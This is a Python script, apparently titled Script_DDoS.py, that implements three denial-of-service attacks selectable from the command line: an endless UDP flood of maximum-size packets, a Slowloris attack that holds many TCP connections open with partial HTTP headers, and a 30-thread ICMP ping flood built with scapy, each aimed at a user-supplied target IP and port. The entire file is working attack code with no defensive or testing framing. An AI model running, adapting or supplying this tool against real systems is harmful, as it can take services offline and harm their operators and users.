import sys
import socket
from scapy.all import *
import threading

def udp_flood(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = b'A' * 65507  # Maximum size of UDP packet payload
    while True:
        client.sendto(bytes, (target_ip, target_port))

def slowloris(target_ip, target_port, total_requests=500):
    list_of_sockets = []
    for _ in range(total_requests):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            list_of_sockets.append(s)
        except socket.error:
            break

    while True:
        for s in list_of_sockets:
            try:
                s.send(b"X-a: b\r\n")
            except socket.error:
                list_of_sockets.remove(s)
        if not list_of_sockets:
            break
    print("\nSlowloris attack finished.")

def ping_flood(target_ip):
    def flood():
        packet = IP(dst=target_ip) / ICMP() / (b'A' * 60000)  # 60000 bytes payload
        while True:
            send(packet, verbose=False)
    
    threads = []
    for _ in range(30):  # Number of threads set to 30
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 Script_DDoS.py [attack_type] [target_ip] [target_port] [total_requests (only for slowloris)]")
        sys.exit(1)
    
    attack_type = sys.argv[1]
    target_ip = sys.argv[2]
    target_port = int(sys.argv[3])

    if attack_type == "udpflood":
        udp_flood(target_ip, target_port)
    elif attack_type == "slowloris":
        total_requests = int(sys.argv[4]) if len(sys.argv) > 4 else 500
        slowloris(target_ip, target_port, total_requests)
    elif attack_type == "pingflood":
        ping_flood(target_ip)
    else:
        print("Invalid attack type! Use udpflood, slowloris, or pingflood.")
        sys.exit(1)
